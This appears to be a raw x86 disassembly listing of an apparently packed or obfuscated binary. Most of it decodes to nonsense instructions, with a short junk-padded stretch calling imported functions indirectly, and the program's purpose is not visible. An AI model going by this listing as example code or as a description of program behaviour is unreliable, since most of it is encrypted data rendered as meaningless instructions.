  4035e6:	scas   al,BYTE PTR es:[edi]
  4035e7:	fadd   st,st(2)
  4035e9:	mov    WORD PTR [esi],?
  4035eb:	loop   0x4035da
  4035ed:	jge    0x4035a4
  4035ef:	dec    eax
  4035f0:	inc    ebp
  4035f1:	and    eax,0x4067f05
  4035f6:	sbb    bh,ah
  4035f8:	fisubr WORD PTR [edx+0x5a]
  4035fb:	clc    
  4035fc:	jne    0x4035be
  4035fe:	adc    ebx,DWORD PTR [esi+0x4d]
  403601:	loope  0x40359f
  403603:	jg     0x4035db
  403605:	pop    ss
  403606:	mov    esp,0x2065f288
  40360b:	xor    ch,ah
  40360d:	test   BYTE PTR [ebx-0x16],0xc9
  403611:	push   eax
  403612:	adc    al,0x51
  403614:	retf   
  403615:	sbb    BYTE PTR [edi-0x4c147a99],ch
  40361b:	adc    bl,BYTE PTR [ebx+0x52]
  40361e:	mov    edx,0xe0065224
  403623:	xor    BYTE PTR [ecx+0x36ac89ff],bh
  403629:	fstp   TBYTE PTR [edi-0xe]
  40362c:	scas   al,BYTE PTR es:[edi]
  40362d:	pop    edx
  40362e:	mov    ds:0x6493f4f8,eax
  403633:	aad    0xf9
  403635:	imul   ebp,DWORD PTR [edi+ebp*8+0x8],0x36
  40363a:	add    esp,DWORD PTR [ebx*4-0x5aa33de5]
  403641:	sbb    edi,0x12
  403644:	fcomp  DWORD PTR [ecx]
  403646:	shl    ecx,cl
  403648:	push   cs
  403649:	icebp  
  40364a:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40364c:	and    eax,0x746d28c4
  403651:	cmp    al,0xc4
  403653:	cs popa 
  403655:	and    BYTE PTR [edi],ah
  403657:	imul   eax,DWORD PTR [ebx+0x2a],0x799648de
  40365e:	push   ebx
  40365f:	int    0x4a
  403661:	ins    BYTE PTR es:[edi],dx
  403662:	xchg   ebx,eax
  403663:	cmp    eax,0xdb805765
  403668:	inc    ecx
  403669:	mov    dh,0x43
  40366b:	fs scas al,BYTE PTR es:[edi]
  40366d:	or     al,0x41
  40366f:	mov    ecx,0xf008823b
  403674:	inc    edx
  403675:	add    eax,0x4513b0c1
  40367a:	out    dx,eax
  40367b:	sbb    dh,BYTE PTR [eax+0x67]
  40367e:	push   0x2c267f8d
  403683:	enter  0x932b,0x5f
  403687:	mov    dh,0xee
  403689:	jmp    0x40362f
  40368b:	xchg   esp,eax
  40368c:	and    ebx,DWORD PTR [edx+0x27b96900]
  403692:	cmp    al,0xec
  403694:	mov    esi,0x90bf45a0
  403699:	xchg   BYTE PTR [eax],dh
  40369b:	lods   al,BYTE PTR ds:[esi]
  40369c:	repz jne 0x40369f
  40369f:	xor    BYTE PTR [eax-0x12944c4c],dl
  4036a5:	(bad)  
  4036a6:	jno    0x403676
  4036a8:	sub    al,0x78
  4036aa:	repz repz cmp al,0x24
  4036ae:	mov    esi,0x2c1bc5e7
  4036b3:	mov    edi,0xb2cfbdf5
  4036b8:	push   ebx
  4036b9:	imul   BYTE PTR [ecx+esi*2+0x57]
  4036bd:	and    al,0x2c
  4036bf:	outs   dx,BYTE PTR ds:[esi]
  4036c0:	aad    0x8c
  4036c2:	lods   al,BYTE PTR ds:[esi]
  4036c3:	push   0x4a7b9f49
  4036c8:	out    0xcb,al
  4036ca:	add    ah,bh
  4036cc:	das    
  4036cd:	(bad)  
  4036ce:	mov    cl,0xdd
  4036d0:	mov    ch,0x17
  4036d2:	adc    al,0x38
  4036d4:	shl    edi,0x31
  4036d7:	push   esi
  4036d8:	xchg   ebx,eax
  4036d9:	jmp    0x26452829
  4036de:	sbb    edi,esi
  4036e0:	jmp    0x4bae8730
  4036e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036e6:	dec    ebx
  4036e7:	mov    eax,0xd2910aa2
  4036ec:	xchg   ebp,eax
  4036ed:	adc    eax,0x672e20a8
  4036f2:	frstor [edx-0x5]
  4036f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036f6:	cmp    bl,BYTE PTR [edx-0x58133d24]
  4036fc:	enter  0x87c1,0x3
  403700:	rcl    esp,0xa7
  403703:	in     al,dx
  403704:	test   BYTE PTR [edx+0x68],bh
  403707:	mov    cl,0xad
  403709:	popa   
  40370a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40370b:	ficomp WORD PTR [eax-0x33]
  40370e:	add    bh,BYTE PTR [ecx]
  403710:	mov    edi,0xdb3d4a7b
  403715:	inc    ebp
  403716:	mov    BYTE PTR [edx-0x49],0x1c
  40371a:	je     0x403741
  40371c:	mov    al,0x50
  40371e:	out    0x15,al
  403720:	jae    0x40371c
  403722:	pop    esi
  403723:	cdq    
  403724:	jo     0x4036b6
  403726:	or     eax,0xfc5ec6d3
  40372b:	dec    ebp
  40372c:	cdq    
  40372d:	ss jae 0x4036e0
  403730:	adc    eax,0xb4999a0
  403735:	out    0x9b,eax
  403737:	cmp    cl,BYTE PTR [edx+0xa67710b]
  40373d:	jp     0x40374d
  40373f:	std    
  403740:	pop    edi
  403741:	add    bl,BYTE PTR [ebx+0x5d]
  403744:	push   ecx
  403745:	je     0x403753
  403747:	enter  0xdd9c,0x61
  40374b:	sbb    eax,0xb248b167
  403750:	jl     0x4037bd
  403752:	xlat   BYTE PTR ds:[ebx]
  403753:	sbb    esp,esi
  403755:	xor    BYTE PTR [ebx+0x167257ab],0x9b
  40375c:	shr    BYTE PTR [esi-0x7e],0x47
  403760:	pop    edi
  403761:	and    ebx,DWORD PTR ds:0x339b0b60
  403767:	fild   DWORD PTR [edi]
  403769:	dec    eax
  40376a:	fsub   QWORD PTR ds:0x73a57c1b
  403770:	ret    0x99e
  403773:	jae    0x4036f8
  403775:	xchg   esp,eax
  403776:	aad    0x25
  403778:	pop    ecx
  403779:	inc    ebp
  40377a:	xchg   eax,eax
  40377c:	addr16 xchg edx,eax
  40377e:	repz add eax,0x82aebe6
  403784:	jb     0x403769
  403786:	adc    ebp,DWORD PTR [edx+0x43]
  403789:	fs loop 0x403760
  40378c:	xchg   ecx,eax
  40378d:	adc    BYTE PTR [esi-0x5b3a33e9],al
  403793:	hlt    
  403794:	ja     0x40379b
  403796:	shl    al,cl
  403798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403799:	or     edx,DWORD PTR [esi+ecx*2+0x69]
  40379d:	cmp    eax,0xc80b122f
  4037a2:	cli    
  4037a3:	(bad)  
  4037a4:	mov    eax,eax
  4037a6:	mov    eax,ds:0xb9d2a1ac
  4037ab:	out    dx,eax
  4037ac:	inc    ecx
  4037ad:	stos   BYTE PTR es:[edi],al
  4037ae:	mov    BYTE PTR [eax+eiz*8],al
  4037b1:	inc    eax
  4037b2:	sbb    al,0x3f
  4037b4:	push   ss
  4037b5:	dec    ebp
  4037b6:	(bad)  
  4037b7:	xchg   esi,eax
  4037b8:	sbb    eax,0x6c77afbf
  4037bd:	adc    esp,DWORD PTR ds:0xb9e5afd1
  4037c3:	outs   dx,BYTE PTR ds:[esi]
  4037c4:	mov    ah,0xcb
  4037c6:	fsubr  st(3),st
  4037c8:	cmp    bh,0xc5
  4037cb:	mov    cl,0x4f
  4037cd:	inc    edx
  4037ce:	sbb    al,0xb2
  4037d0:	push   cs
  4037d1:	fmul   QWORD PTR ss:[ebp-0x34a88ac0]
  4037d8:	pop    edi
  4037d9:	xor    ebp,DWORD PTR [edx-0x3fbfb2ba]
  4037df:	call   0x5dca440
  4037e4:	xor    edx,DWORD PTR [ecx]
  4037e6:	mov    WORD PTR [ecx+eiz*1+0x63],ds
  4037ea:	adc    al,0xa6
  4037ec:	jmp    0x5da6c6f6
  4037f1:	xor    BYTE PTR [ecx],cl
  4037f3:	fucomp st(0)
  4037f5:	add    DWORD PTR [edi-0x73a671b],ebx
  4037fb:	push   eax
  4037fc:	sbb    al,0xf9
  4037fe:	sub    eax,0x4e929a69
  403803:	xor    bl,bh
  403805:	push   edi
  403806:	out    dx,eax
  403807:	bound  edx,QWORD PTR ds:0x5f88ff2f
  40380d:	jo     0x4037e0
  40380f:	shl    BYTE PTR ds:0xc6d37d38,0x87
  403816:	xchg   edx,eax
  403817:	outs   dx,DWORD PTR ds:[esi]
  403818:	xor    DWORD PTR [eax+0x33],0xffffffb7
  40381c:	push   cs
  40381d:	cmp    eax,0x3ba8fb8d
  403822:	gs jb  0x403876
  403825:	sahf   
  403826:	or     DWORD PTR [eax],0xc38105f9
  40382c:	inc    edi
  40382d:	retf   0x1180
  403830:	xchg   edx,eax
  403831:	popf   
  403832:	imul   BYTE PTR [eax-0x5c]
  403835:	sub    BYTE PTR [eax+0x67],al
  403838:	mov    ebp,0xe50c52c9
  40383d:	sbb    DWORD PTR [ebp+0x19],0x9f783276
  403844:	cwde   
  403845:	outs   dx,BYTE PTR ds:[esi]
  403846:	out    0x14,al
  403848:	add    esp,esp
  40384a:	fisubr DWORD PTR gs:[edi]
  40384d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40384e:	dec    ebp
  40384f:	push   esi
  403850:	dec    ebp
  403851:	pop    edi
  403852:	imul   esi,DWORD PTR [esi-0xa2f692c],0xfecb03f1
  40385c:	(bad)  
  40385d:	popa   
  40385e:	pop    ss
  40385f:	stos   BYTE PTR es:[edi],al
  403860:	fs in  al,0x50
  403863:	cmp    eax,0x25eabf67
  403868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403869:	dec    edx
  40386a:	xchg   esp,eax
  40386b:	add    ecx,ebx
  40386d:	pop    es
  40386e:	cld    
  40386f:	cmp    DWORD PTR [ebp-0x9],edx
  403872:	cmp    BYTE PTR [eax-0x7e],dh
  403875:	dec    ebx
  403876:	xchg   esi,eax
  403877:	mov    dh,0x6e
  403879:	dec    esp
  40387a:	and    esp,edi
  40387c:	xor    ecx,DWORD PTR [ecx*8+0x66f26995]
  403883:	pop    es
  403884:	call   0x345b:0x44ab359
  40388b:	mov    edx,0x98d5760f
  403890:	loop   0x403821
  403892:	jmp    DWORD PTR [ecx-0x6e]
  403895:	dec    edi
  403896:	fwait
  403897:	sub    eax,0x4c0da922
  40389c:	ret    0x552f
  40389f:	jo     0x403878
  4038a1:	call   DWORD PTR [edx-0x526245e6]
  4038a7:	pop    ecx
  4038a8:	call   0x3d4a:0x2c8c8c35
  4038af:	or     eax,0xb6706bb8
  4038b4:	in     eax,dx
  4038b5:	loop   0x4038d3
  4038b7:	mov    BYTE PTR [ebx],dl
  4038b9:	aad    0xe7
  4038bb:	cli    
  4038bc:	jnp    0x40392a
  4038be:	xor    al,0x4e
  4038c0:	mov    al,0x32
  4038c2:	adc    DWORD PTR [edx+0x4],eax
  4038c5:	lds    edi,FWORD PTR [eax-0x42]
  4038c8:	jbe    0x4038bf
  4038ca:	std    
  4038cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038cc:	jge    0x403904
  4038ce:	cmp    ch,BYTE PTR [edx+0x35b162fe]
  4038d4:	sub    ebx,DWORD PTR [ebx]
  4038d6:	jae    0x403950
  4038d8:	leave  
  4038d9:	test   eax,0xfd92130e
  4038de:	cmp    al,0x32
  4038e0:	cwde   
  4038e1:	loop   0x40393e
  4038e3:	pop    gs
  4038e5:	shrd   ecx,edx,0x2
  4038e9:	xor    DWORD PTR ds:0x4284b5,0x428565
  4038f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4038f6:	mov    ecx,DWORD PTR [ebp+0x18]
  4038f9:	xor    DWORD PTR ds:0x428449,0x428571
  403903:	xor    DWORD PTR [ebp-0x1c],edi
  403906:	adc    DWORD PTR ds:0x428435,0x4aad
  403910:	shl    ecx,0x1e
  403913:	not    DWORD PTR ds:0x4283fd
  403919:	xor    ecx,ecx
  40391b:	sub    DWORD PTR ds:0x428549,0x450d
  403925:	or     ecx,DWORD PTR [ebp-0x1c]
  403928:	jmp    0x403cc9
  40392d:	cdq    
  40392e:	jbe    0x40398b
  403930:	fidivr WORD PTR [ebx+eiz*8-0x40084545]
  403937:	mul    BYTE PTR [esp+esi*2-0x42307bb5]
  40393e:	in     eax,dx
  40393f:	mov    esi,0xbec4bdbe
  403944:	mov    esi,0xc1d3bd3e
  403949:	icebp  
  40394a:	add    DWORD PTR ds:0x5e718dc8,eax
  403950:	sub    al,0x97
  403952:	xor    edx,eax
  403954:	mov    bh,0x7e
  403956:	pop    edx
  403957:	addr16 inc esp
  403959:	pop    esp
  40395a:	call   0x76f6d93d
  40395f:	es ins DWORD PTR es:[edi],dx
  403961:	les    esi,FWORD PTR [ecx]
  403963:	popa   
  403964:	cmp    al,0xe4
  403966:	sub    BYTE PTR [esi],al
  403968:	test   DWORD PTR [esi+0x75c58730],0x3ca31878
  403972:	fcom   DWORD PTR [edi+0x6eca632f]
  403978:	loop   0x4039b0
  40397a:	lea    ebp,[edi-0x127b4954]
  403980:	adc    ebx,edx
  403982:	cld    
  403983:	and    eax,0xe512ae9e
  403988:	fnstsw WORD PTR [ebp-0x5a]
  40398b:	xor    BYTE PTR [edi-0x66e10b3f],0x78
  403992:	mov    bx,0x1740
  403996:	xchg   BYTE PTR [edx-0x1c],ah
  403999:	ds jb  0x40393e
  40399c:	sbb    eax,0xf8cfc922
  4039a1:	or     al,0x4
  4039a3:	div    BYTE PTR [edx-0x6e8bdf04]
  4039a9:	cwde   
  4039aa:	sub    eax,DWORD PTR [ecx-0x59]
  4039ad:	retf   0xea5
  4039b0:	or     ebp,ebx
  4039b2:	pop    edi
  4039b3:	adc    DWORD PTR [ebx],eax
  4039b5:	or     DWORD PTR [esi+0x2d],ecx
  4039b8:	mov    ds:0x453c5857,al
  4039bd:	(bad)  
  4039be:	fldenv [edx]
  4039c0:	into   
  4039c1:	leave  
  4039c2:	dec    eax
  4039c3:	jg     0x403985
  4039c5:	and    eax,0x441c7378
  4039ca:	mov    al,ds:0x15ca6120
  4039cf:	aam    0x5e
  4039d1:	xchg   edi,eax
  4039d2:	cld    
  4039d3:	(bad)  
  4039d4:	shl    DWORD PTR [ebp+eiz*1+0x368a1409],1
  4039db:	mov    ecx,DWORD PTR [ecx+0x6be83344]
  4039e1:	nop
  4039e2:	aaa    
  4039e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039e4:	push   es
  4039e5:	add    BYTE PTR [edi+0x63],dh
  4039e8:	push   esi
  4039e9:	lahf   
  4039ea:	lods   al,BYTE PTR ds:[esi]
  4039eb:	dec    esp
  4039ec:	test   BYTE PTR [esi],ah
  4039ee:	cld    
  4039ef:	mov    esp,0x58ac4a33
  4039f4:	repz cmp cl,BYTE PTR [esi+0x46fdc982]
  4039fb:	pop    eax
  4039fc:	pop    esp
  4039fd:	pop    ss
  4039fe:	dec    esi
  4039ff:	mov    ds:0xffd5f894,eax
  403a04:	cmp    DWORD PTR ds:0xbfb9b50,esp
  403a0a:	inc    ecx
  403a0b:	lock pop ebx
  403a0d:	ds sar dh,cl
  403a10:	ins    BYTE PTR es:[di],dx
  403a12:	push   ds
  403a13:	cmp    BYTE PTR [ebx+0xd],ch
  403a16:	ror    bl,cl
  403a18:	adc    DWORD PTR [ecx],edx
  403a1a:	imul   ebx,DWORD PTR [esi+0x7edd035],0xc4652d1f
  403a24:	jns    0x4039ff
  403a26:	jle    0x4039b7
  403a28:	mov    cl,0x67
  403a2a:	sti    
  403a2b:	mov    dh,0xbe
  403a2d:	sbb    DWORD PTR [ecx-0x994b6fb],ebx
  403a33:	and    al,0xe0
  403a35:	push   0xb0f15b40
  403a3a:	sar    DWORD PTR [edx-0x27],1
  403a3d:	add    ebp,edx
  403a3f:	mov    bl,0xdf
  403a41:	ja     0x403a27
  403a43:	stc    
  403a44:	xlat   BYTE PTR ds:[ebx]
  403a45:	imul   eax,DWORD PTR [esi],0x64
  403a48:	jecxz  0x4039db
  403a4a:	dec    esi
  403a4b:	and    DWORD PTR [ecx],esi
  403a4d:	mov    bl,0xdf
  403a4f:	sbb    eax,0x24cf193
  403a54:	scas   al,BYTE PTR es:[edi]
  403a55:	mov    ds:0xfba8a45f,al
  403a5a:	inc    edi
  403a5b:	rol    dh,cl
  403a5d:	shl    BYTE PTR [ebx+0x2a],1
  403a60:	push   ds
  403a61:	push   ebx
  403a62:	or     DWORD PTR [edi+esi*2-0xd],0x23905958
  403a6a:	ror    BYTE PTR [edx+eax*1],0xe7
  403a6e:	push   ss
  403a6f:	bound  eax,QWORD PTR [eax-0x4184f91c]
  403a75:	pop    ss
  403a76:	aas    
  403a77:	jg     0x403a22
  403a79:	(bad)  [eax]
  403a7b:	es aaa 
  403a7d:	sahf   
  403a7e:	mov    eax,ds:0xa4b5529c
  403a83:	or     BYTE PTR [ebx],dh
  403a85:	inc    edi
  403a86:	lock sbb DWORD PTR ss:[ebp+0xb],ebp
  403a8b:	cdq    
  403a8c:	ret    
  403a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a8e:	or     eax,ecx
  403a90:	add    eax,0x4674476d
  403a95:	cmc    
  403a96:	imul   DWORD PTR [ebp+0x228f4298]
  403a9c:	push   ecx
  403a9d:	sti    
  403a9e:	rcr    DWORD PTR [eax],1
  403aa0:	adc    DWORD PTR [ebx-0x3e6322e9],ecx
  403aa6:	push   0xffffffaa
  403aa8:	push   ecx
  403aa9:	int    0xd6
  403aab:	push   0xffffff86
  403aad:	jno    0x403a95
  403aaf:	test   eax,0x3974b96e
  403ab4:	xchg   ecx,eax
  403ab5:	sub    esi,ecx
  403ab7:	add    DWORD PTR [ebx],eax
  403ab9:	push   edi
  403aba:	mov    ds:0x77329fd4,al
  403abf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ac0:	imul   ebx,DWORD PTR [esi+0x57],0x72
  403ac4:	(bad)  
  403ac5:	ret    
  403ac6:	jnp    0x403a72
  403ac8:	ds cmp al,0xc3
  403acb:	sub    DWORD PTR [ecx-0x17f11d1f],edi
  403ad1:	retf   0xbed9
  403ad4:	js     0x403a76
  403ad6:	xchg   edx,eax
  403ad7:	mov    al,ds:0xeb2c1ae1
  403adc:	add    bh,bl
  403ade:	rcr    ch,1
  403ae0:	test   DWORD PTR [esi],eax
  403ae2:	lahf   
  403ae3:	mov    ebp,0x42e064b4
  403ae8:	dec    ecx
  403ae9:	xor    ebx,DWORD PTR [edx-0x3c874bcb]
  403aef:	inc    esp
  403af0:	imul   edx,DWORD PTR [edi-0x6036bbd5],0xffffffb3
  403af7:	pop    ecx
  403af8:	jp     0x403b3d
  403afa:	jp     0x403b6a
  403afc:	out    dx,al
  403afd:	aam    0x54
  403aff:	pop    esi
  403b00:	sbb    DWORD PTR [eax-0x63],ecx
  403b03:	out    dx,eax
  403b04:	sbb    BYTE PTR [ebp+0x271d496a],dh
  403b0a:	dec    edi
  403b0b:	dec    esp
  403b0c:	cld    
  403b0d:	jbe    0x403b8d
  403b0f:	call   0x2fce09f
  403b14:	inc    ebx
  403b15:	test   DWORD PTR [ecx],edx
  403b17:	jne    0x403b17
  403b19:	xchg   DWORD PTR [ecx],esp
  403b1b:	pop    ds
  403b1c:	xchg   BYTE PTR [esi+eax*4-0x6b29a3b],dh
  403b23:	inc    esp
  403b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b25:	int    0x19
  403b27:	sub    eax,DWORD PTR [edx-0x5985ccf5]
  403b2d:	xor    al,0xf0
  403b2f:	imul   BYTE PTR [ebx+ecx*1]
  403b32:	je     0x403aee
  403b34:	not    eax
  403b36:	inc    edx
  403b37:	pop    eax
  403b38:	call   0xe55324f7
  403b3d:	retf   0xeb1e
  403b40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b41:	pop    es
  403b42:	sub    BYTE PTR [edx+0x57ffb080],bh
  403b48:	inc    esp
  403b49:	fdivr  st(4),st
  403b4b:	xchg   ebp,eax
  403b4c:	xchg   esi,eax
  403b4d:	test   BYTE PTR [ecx-0x57],0x53
  403b51:	jns    0x403b52
  403b53:	pop    ebp
  403b54:	std    
  403b55:	imul   ecx,DWORD PTR [esi+0x36f6ae68],0x2229de6e
  403b5f:	out    dx,al
  403b60:	and    DWORD PTR [edi+0x2295a914],ecx
  403b66:	retf   
  403b67:	rcl    dl,0x5d
  403b6a:	mov    ds:0x32e3860b,al
  403b6f:	lods   al,BYTE PTR ds:[esi]
  403b70:	imul   esp,ecx,0xffffff91
  403b73:	ror    ah,0x16
  403b76:	inc    esi
  403b77:	pop    ebp
  403b78:	mov    ecx,0x8f8bfb1f
  403b7d:	ret    0xb717
  403b80:	cmp    al,0x7a
  403b82:	cli    
  403b83:	es addr16 ret 
  403b86:	test   eax,0xc0420cc8
  403b8b:	stos   BYTE PTR es:[edi],al
  403b8c:	mov    al,0x83
  403b8e:	scas   al,BYTE PTR es:[edi]
  403b8f:	icebp  
  403b90:	or     edx,DWORD PTR [eax]
  403b92:	add    edi,esp
  403b94:	inc    ecx
  403b95:	sbb    ch,BYTE PTR [eax+edi*8+0x13]
  403b99:	sar    BYTE PTR cs:[ebx-0x23e97130],1
  403ba0:	mov    dh,BYTE PTR [ebp+0x31]
  403ba3:	sub    ebp,DWORD PTR [edi]
  403ba5:	mov    bh,0xbd
  403ba7:	lea    esi,[edx-0x15]
  403baa:	and    al,0x15
  403bac:	sub    ebp,DWORD PTR [eax]
  403bae:	mov    ebp,ebp
  403bb0:	xor    eax,0x6e166091
  403bb5:	add    cl,bh
  403bb7:	(bad)  ds:0x8c60dc64
  403bbd:	cld    
  403bbe:	push   ebx
  403bbf:	xchg   ebp,eax
  403bc0:	push   cs
  403bc1:	les    ebp,FWORD PTR cs:[ebp+0x698af715]
  403bc8:	cmp    ch,bh
  403bca:	jo     0x403be2
  403bcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bcd:	mov    ds,ebp
  403bcf:	pop    eax
  403bd0:	outs   dx,BYTE PTR ds:[esi]
  403bd1:	icebp  
  403bd2:	or     eax,0x8f88f164
  403bd7:	and    DWORD PTR [eax-0xa],ecx
  403bda:	int3   
  403bdb:	in     eax,dx
  403bdc:	adc    ebp,DWORD PTR [esp+esi*2-0x20]
  403be0:	repnz fisub DWORD PTR fs:[ebp+ebx*8-0x7d]
  403be6:	xor    ebx,DWORD PTR [esi]
  403be8:	and    DWORD PTR [edx-0x18],esp
  403beb:	cld    
  403bec:	push   esi
  403bed:	cmp    bl,BYTE PTR [ecx]
  403bef:	lods   eax,DWORD PTR ds:[esi]
  403bf0:	mov    BYTE PTR [ebx+0x50],al
  403bf3:	imul   edx,DWORD PTR [esi-0x61],0xd98734d6
  403bfa:	sub    bh,al
  403bfc:	in     al,dx
  403bfd:	mov    dl,0x16
  403bff:	mov    ah,0xbe
  403c01:	xor    DWORD PTR [ebx+0x3ff33aba],ebp
  403c07:	add    DWORD PTR [eax+0x26],ebx
  403c0a:	fld    DWORD PTR [ebx+edx*8]
  403c0d:	call   DWORD PTR [edx-0x6811d2bf]
  403c13:	scas   al,BYTE PTR es:[edi]
  403c14:	cld    
  403c15:	jae    0x403bdc
  403c17:	sbb    BYTE PTR [eax],cl
  403c19:	add    DWORD PTR [ecx-0x673d396e],0x21d1cd10
  403c23:	ret    0x9117
  403c26:	les    ecx,FWORD PTR [edi+0x25]
  403c29:	dec    edi
  403c2a:	pop    edx
  403c2b:	retf   
  403c2c:	sub    al,0x93
  403c2e:	fisubr DWORD PTR [esi+0xb]
  403c31:	daa    
  403c32:	xchg   ebx,eax
  403c33:	sub    eax,0x3fcee3a4
  403c38:	mov    bl,0xae
  403c3a:	(bad)  
  403c3b:	push   ebx
  403c3c:	iret   
  403c3d:	je     0x403c57
  403c3f:	jno    0x403be4
  403c41:	pop    edi
  403c42:	int    0x79
  403c44:	dec    ebp
  403c45:	jbe    0x403c70
  403c47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c48:	xlat   BYTE PTR ds:[ebx]
  403c49:	sar    BYTE PTR [ebx+0x38],0x77
  403c4d:	les    edi,FWORD PTR [esi]
  403c4f:	test   DWORD PTR [ecx],edi
  403c51:	xlat   BYTE PTR ds:[ebx]
  403c52:	wbinvd 
  403c54:	mul    DWORD PTR [eax-0x71]
  403c57:	mov    fs,WORD PTR [edi]
  403c59:	push   cs
  403c5a:	xchg   esp,eax
  403c5b:	rol    BYTE PTR [edx+ecx*8],1
  403c5e:	out    0x90,al
  403c60:	adc    eax,0x5ee7fe7a
  403c65:	retf   0xe3ce
  403c68:	fsub   QWORD PTR [edx]
  403c6a:	test   BYTE PTR ds:0x51497c56,ch
  403c70:	pop    ebx
  403c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c72:	jno    0x403c7d
  403c74:	stc    
  403c75:	nop
  403c76:	sub    dl,BYTE PTR [ecx+0x73f66d0]
  403c7c:	fsub   st(1),st
  403c7e:	in     eax,dx
  403c7f:	xchg   edi,eax
  403c80:	test   BYTE PTR [edi-0x53b1fd75],0xf3
  403c87:	jbe    0x403c12
  403c89:	add    eax,0x755f3d1
  403c8e:	leave  
  403c8f:	es or  ah,ch
  403c92:	push   ebx
  403c93:	add    cl,BYTE PTR [eax+0x79]
  403c96:	aam    0xcc
  403c98:	cwde   
  403c99:	or     al,0x48
  403c9b:	in     al,dx
  403c9c:	or     ch,cl
  403c9e:	mov    WORD PTR [ebp-0x36a1c32f],ds
  403ca4:	jmp    0x403c77
  403ca6:	sub    BYTE PTR [ebp+0x62],bl
  403ca9:	popa   
  403caa:	aaa    
  403cab:	retf   
  403cac:	inc    ecx
  403cad:	pop    es
  403cae:	dec    eax
  403caf:	mov    esi,0xbfc27dfd
  403cb4:	xchg   ebx,eax
  403cb5:	mov    esp,0x6c2aa1a8
  403cba:	aas    
  403cbb:	test   eax,0xbc3688e8
  403cc0:	add    DWORD PTR [esi],0x887fe737
  403cc6:	or     ch,BYTE PTR ds:[edi+0xf02eac1]
  403ccd:	mov    bh,0x15
  403ccf:	add    DWORD PTR [edx+eax*2-0x2eadf00],eax
  403cd6:	add    DWORD PTR [edx+0x0],0xffffff8b
  403cda:	push   ebp
  403cdb:	sbb    al,0x83
  403cdd:	cmp    eax,0x428465
  403ce2:	add    BYTE PTR [edx+0xb30],bh
  403ce8:	not    DWORD PTR ds:0x42832d
  403cee:	jmp    0x403db9
  403cf3:	mov    DWORD PTR ds:0x428331,0x7955
  403cfd:	mov    DWORD PTR ds:0x4284bd,0x3fbe
  403d07:	cmp    DWORD PTR ds:0x428465,0x0
  403d0e:	jae    0x403d49
  403d14:	push   0x2165
  403d19:	push   0x209b
  403d1e:	push   0x61ab
  403d23:	push   0x585a
  403d28:	push   DWORD PTR [ebp-0x14]
  403d2b:	call   DWORD PTR ds:0x42e0c0
  403d31:	xor    DWORD PTR ds:0x4283fd,edi
  403d37:	xor    DWORD PTR ds:0x428409,edi
  403d3d:	xor    edx,DWORD PTR ds:0x428469
  403d43:	sub    DWORD PTR ds:0x428355,edi
  403d49:	sbb    DWORD PTR ds:0x428471,0x3090
  403d53:	sub    DWORD PTR ds:0x428421,ecx
  403d59:	xor    DWORD PTR ds:0x4284cd,edi
  403d5f:	cmp    DWORD PTR ds:0x42853d,0x0
  403d66:	mov    edx,0x71bd
  403d6b:	not    edx
  403d6d:	jmp    0x403db9
  403d72:	mov    edx,0x37a5
  403d77:	mov    edx,0x5337
  403d7c:	cmp    DWORD PTR ds:0x42853d,0x0
  403d83:	jle    0x403dad
  403d89:	push   0x428435
  403d8e:	call   DWORD PTR ds:0x42e0c4
  403d94:	mov    edx,DWORD PTR ds:0x428511
  403d9a:	mov    edx,DWORD PTR [edx]
  403d9c:	and    DWORD PTR ds:0x42831d,edx
  403da2:	adc    DWORD PTR ds:0x428419,0x11e9
  403dac:	dec    edx
  403dad:	and    edx,0xf08
  403db3:	sub    edx,DWORD PTR ds:0x428561
  403db9:	mov    DWORD PTR [ebp-0x2c],ecx
  403dbc:	mov    ecx,DWORD PTR [esi]
  403dbe:	add    DWORD PTR ds:0x428435,ebx
  403dc4:	mov    edx,DWORD PTR [esi+0x4]
  403dc7:	or     DWORD PTR ds:0x428325,0x428339
  403dd1:	shrd   ecx,edx,0x2
  403dd5:	xor    DWORD PTR ds:0x4284c9,0x24cb
  403ddf:	shr    edx,0x2
  403de2:	and    edx,DWORD PTR ds:0x428551
  403de8:	mov    DWORD PTR [ebp-0x1c],ecx
  403deb:	mov    ecx,DWORD PTR [esi]
  403ded:	mov    edx,DWORD PTR [esi+0x4]
  403df0:	xor    DWORD PTR [ebp-0x1c],edi
  403df3:	xor    edx,edx
  403df5:	or     edx,DWORD PTR [ebp-0x1c]
  403df8:	sub    DWORD PTR ds:0x4283fd,0x5e3f
  403e02:	shl    ecx,0x1e
  403e05:	sbb    DWORD PTR ds:0x4283fd,0x5068
  403e0f:	add    edx,DWORD PTR [ebp-0x2c]
  403e12:	jmp    0x4041b3
  403e17:	bound  ecx,QWORD PTR [ebx-0x73d3f5ff]
  403e1d:	push   0xffffffab
  403e1f:	(bad)  
  403e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e21:	push   ss
  403e22:	rcl    DWORD PTR [ecx-0x415b099c],1
  403e28:	cmc    
  403e29:	mov    esi,0xbec4bdbe
  403e2e:	mov    esi,0x93a762c8
  403e33:	mov    dh,0xcf
  403e35:	and    BYTE PTR [esi+esi*4+0x1b8d585a],bl
  403e3c:	ret    
  403e3d:	dec    eax
  403e3e:	mov    eax,ds:0xee1ad25b
  403e43:	test   bh,ch
  403e45:	mov    BYTE PTR [esi+eiz*2+0x303d0352],al
  403e4c:	mov    ds:0xa03b5a1,eax
  403e51:	jb     0x403ddc
  403e53:	cmp    edi,DWORD PTR ds:0x2ec67f68
  403e59:	inc    esp
  403e5a:	xor    ch,ch
  403e5c:	mov    eax,ds:0x5b35bd5e
